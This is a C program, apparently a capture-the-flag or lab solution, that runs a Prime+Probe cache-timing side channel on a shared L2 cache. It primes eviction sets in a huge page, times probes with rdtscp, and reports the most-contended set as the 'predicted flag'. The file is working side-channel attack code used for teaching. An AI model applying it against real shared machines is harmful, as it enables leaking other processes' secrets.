#include "util.h"

#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <time.h>

#ifndef MAP_POPULATE
#define MAP_POPULATE 0
#endif

#ifndef MAP_ANONYMOUS
#define MAP_ANONYMOUS MAP_ANON
#endif

#ifndef MAP_HUGETLB
#define MAP_HUGETLB 0
#endif

#define REGION_BYTES (2ULL * 1024ULL * 1024ULL)
#define LINE_SIZE 64ULL
#define L2_SETS 1024
#define L2_ASSOCIATIVITY 4
#define EV_SET_SIZE (L2_ASSOCIATIVITY + 2)
#define SET_STRIDE (LINE_SIZE * L2_SETS)

#define SCAN_DELAY_ITERS 12000
#define REPORT_INTERVAL_CYCLES 600000000ULL
#define MISS_THRESHOLD_CYCLES 80ULL
#define RATIO_MIN 40ULL
#define RATIO_MAX 100ULL
#define TOP_REPORT_LIMIT 20

static void *reserve_probe_page(void)
{
    void *region = mmap(NULL, REGION_BYTES, PROT_READ | PROT_WRITE,
                        MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
                        -1, 0);

    if (region == (void *)-1) {
        perror("mmap()");
        exit(EXIT_FAILURE);
    }

    return region;
}

static void seed_pages(void *region)
{
    volatile char *p = (volatile char *)region;
    p[0] = 1;
    for (uint64_t i = 0; i < REGION_BYTES; i += LINE_SIZE) {
        p[i] = (char)i;
    }
}

static void load_set_lines(void *region, int set_index, volatile char *probe)
{
    volatile char *base = (volatile char *)region;
    uint64_t set_base = (uint64_t)base + (uint64_t)set_index * LINE_SIZE;

    for (int way = 0; way < EV_SET_SIZE; way++) {
        uint64_t addr = set_base + (uint64_t)way * SET_STRIDE;
        *probe = base[addr - (uint64_t)base];
    }
}

static CYCLES sample_set_latency(void *region, int set_index, int *miss_count)
{
    uint64_t total = 0;
    int misses = 0;
    volatile char *base = (volatile char *)region;
    uint64_t set_base = (uint64_t)base + (uint64_t)set_index * LINE_SIZE;

    for (int way = 0; way < EV_SET_SIZE; way++) {
        uint64_t addr = set_base + (uint64_t)way * SET_STRIDE;
        uint64_t t = measure_one_block_access_time((uint64_t)(base + (addr - (uint64_t)base)));
        total += t;
        if (t > MISS_THRESHOLD_CYCLES) {
            misses++;
        }
    }

    *miss_count = misses;
    return (CYCLES)total;
}

#if defined(__i386__) || defined(__x86_64__) || defined(_M_IX86) || defined(_M_X64)
static inline uint64_t now_cycles(void)
{
    unsigned int lo;
    unsigned int hi;
    unsigned int aux = 0;

    asm volatile("lfence\n\trdtscp"
                 : "=a"(lo), "=d"(hi), "=c"(aux)
                 : : "memory");
    return ((uint64_t)hi << 32) | lo;
}

static inline void serialize_barrier(void)
{
    asm volatile("lfence" : : : "memory");
}
#else
static inline uint64_t now_cycles(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ull + (uint64_t)ts.tv_nsec;
}

static inline void serialize_barrier(void)
{
    asm volatile("" : : : "memory");
}
#endif

static int pick_flag_if_known(void)
{
    const char *env = getenv("CTF_FLAG_SET");
    if (!env) {
        return -1;
    }
    return atoi(env);
}

int main(int argc, char **argv)
{
    (void)argc;
    (void)argv;
    setvbuf(stdout, NULL, _IOLBF, 0);

    void *region = reserve_probe_page();
    volatile char probe = 0;
    seed_pages(region);

    uint64_t *latency_totals = calloc(L2_SETS, sizeof(uint64_t));
    uint64_t *sample_counts = calloc(L2_SETS, sizeof(uint64_t));
    uint64_t *way_miss_totals = calloc(L2_SETS, sizeof(uint64_t));
    uint64_t *epoch_scores = calloc(L2_SETS, sizeof(uint64_t));
    uint64_t *top20_history = calloc(L2_SETS, sizeof(uint64_t));

    if (!latency_totals || !sample_counts || !way_miss_totals || !epoch_scores || !top20_history) {
        perror("calloc");
        exit(EXIT_FAILURE);
    }

    const int expected = pick_flag_if_known();
    if (expected >= 0) {
        printf("Ground-truth enabled via CTF_FLAG_SET=%d (for local validation).\n", expected);
    }

    printf("Buffer at %p. Press Enter to start probing...\n", region);
    {
        char tmp[2];
        if (!fgets(tmp, sizeof(tmp), stdin)) {
            munmap(region, REGION_BYTES);
            free(latency_totals);
            free(sample_counts);
            free(way_miss_totals);
            free(epoch_scores);
            free(top20_history);
            return 0;
        }
    }

    uint64_t report_deadline = now_cycles() + REPORT_INTERVAL_CYCLES;
    uint64_t epoch = 0;

    for (;;) {
        for (int set = 0; set < L2_SETS; set++) {
            load_set_lines(region, set, &probe);

            uint64_t window = now_cycles() + SCAN_DELAY_ITERS;
            while (now_cycles() < window) {
                serialize_barrier();
            }

            int miss_counter = 0;
            latency_totals[set] += sample_set_latency(region, set, &miss_counter);
            way_miss_totals[set] += (uint64_t)miss_counter;
            sample_counts[set]++;
        }

        if (now_cycles() >= report_deadline) {
            epoch++;
            int ranked_sets[TOP_REPORT_LIMIT];
            uint64_t ranked_avgs[TOP_REPORT_LIMIT];
            uint64_t ranked_misses[TOP_REPORT_LIMIT];
            uint64_t ranked_density[TOP_REPORT_LIMIT];
            int ranked_count = 0;

            printf("\n=== Epoch %llu — top 20 hottest sets ===\n", (unsigned long long)epoch);
            printf("%-6s  %-14s  %-12s  %-10s\n", "set", "avg_probe_cyc", "miss_ways", "cyc/miss");

            for (int rank = 0; rank < TOP_REPORT_LIMIT; rank++) {
                int best_set = -1;
                uint64_t top_latency = 0;

                for (int set = 0; set < L2_SETS; set++) {
                    if (sample_counts[set] == 0 || way_miss_totals[set] == 0) {
                        continue;
                    }

                    uint64_t avg_latency = latency_totals[set] / sample_counts[set];
                    uint64_t miss_ratio = avg_latency / way_miss_totals[set];

                    if (miss_ratio < RATIO_MIN || miss_ratio > RATIO_MAX) {
                        continue;
                    }

                    if (avg_latency > top_latency) {
                        top_latency = avg_latency;
                        best_set = set;
                    }
                }

                if (best_set < 0) {
                    break;
                }

                ranked_sets[ranked_count] = best_set;
                ranked_avgs[ranked_count] = latency_totals[best_set] / sample_counts[best_set];
                ranked_misses[ranked_count] = way_miss_totals[best_set];
                ranked_density[ranked_count] = ranked_avgs[ranked_count] / way_miss_totals[best_set];

                printf("%-6d  %-14" PRIu64 "  %-12" PRIu64 "  %-10" PRIu64 "\n",
                       best_set,
                       ranked_avgs[ranked_count],
                       ranked_misses[ranked_count],
                       ranked_density[ranked_count]);

                latency_totals[best_set] = 0;
                way_miss_totals[best_set] = 0;
                sample_counts[best_set] = 0;
                ranked_count++;
            }

            int best_set = -1;
            uint64_t best_appearances = 0;
            uint64_t best_top_avg = 0;
            uint64_t best_top_miss = 0;

            for (int i = 0; i < ranked_count; i++) {
                int set = ranked_sets[i];
                top20_history[set]++;

                if (top20_history[set] > best_appearances ||
                    (top20_history[set] == best_appearances && ranked_avgs[i] > best_top_avg)) {
                    best_appearances = top20_history[set];
                    best_set = set;
                    best_top_avg = ranked_avgs[i];
                    best_top_miss = ranked_misses[i];
                }
            }

            if (best_set >= 0) {
                epoch_scores[best_set]++;
                int most_frequent_set = 0;
                uint64_t most_wins = epoch_scores[0];

                for (int set = 1; set < L2_SETS; set++) {
                    if (epoch_scores[set] > most_wins) {
                        most_wins = epoch_scores[set];
                        most_frequent_set = set;
                    }
                }

                printf("Epoch winner: set %d (top20_hits=%llu, avg=%llu, miss_ways=%llu, cyc/miss=%llu)\n",
                       best_set, (unsigned long long)best_appearances,
                       (unsigned long long)best_top_avg,
                       (unsigned long long)best_top_miss,
                       best_top_miss > 0 ? best_top_avg / best_top_miss : 0);
                printf("Predicted flag: %d\n", most_frequent_set);
                printf("Flag candidate (most frequent winner): set %d with %llu/%llu epoch wins\n",
                       most_frequent_set, (unsigned long long)most_wins, (unsigned long long)epoch);

                if (expected >= 0) {
                    if (most_frequent_set == expected) {
                        printf("Result matched expected set!\n");
                    } else {
                        printf("Expected set was %d\n", expected);
                    }
                }
            } else {
                printf("Epoch winner: none qualified (no sets within ratio band [%llu, %llu])\n",
                       (unsigned long long)RATIO_MIN,
                       (unsigned long long)RATIO_MAX);
            }

            fflush(stdout);
            report_deadline = now_cycles() + REPORT_INTERVAL_CYCLES;
        }
    }

    return 0;
}
